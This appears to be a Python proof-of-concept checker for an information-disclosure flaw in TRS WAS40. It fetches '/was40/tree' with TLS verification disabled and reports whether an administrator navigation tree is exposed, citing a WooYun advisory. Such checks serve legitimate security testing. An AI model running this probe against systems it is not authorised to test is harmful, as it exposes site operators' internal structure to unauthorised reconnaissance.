#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was40 tree导航树泄露
referer: http://www.wooyun.org/bugs/wooyun-2013-038875
author: Lucifer
description: 访问was40/tree可查看信息导航树。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS was40 tree导航树泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was40/tree"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"tree?treekind=navigate" in req.text and r"administrator" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    